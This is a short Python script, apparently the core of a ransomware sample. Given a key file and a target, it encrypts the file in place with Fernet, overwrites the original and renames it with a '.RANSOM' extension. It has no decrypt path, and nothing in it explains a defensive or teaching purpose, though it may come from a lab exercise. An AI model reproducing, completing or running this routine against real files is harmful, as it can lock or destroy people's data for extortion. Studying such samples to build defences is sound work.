from cryptography.fernet import Fernet
import os
import sys


if sys.argv[1] == "-e":
    with open(sys.argv[2], 'rb') as filekey:
        key = filekey.read()

    current_file = sys.argv[3]
    with open(current_file, 'rb') as file:
        original = file.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(original)

    with open(current_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    base = os.path.splitext(current_file)[0]
    os.rename(current_file, base + '.RANSOM')
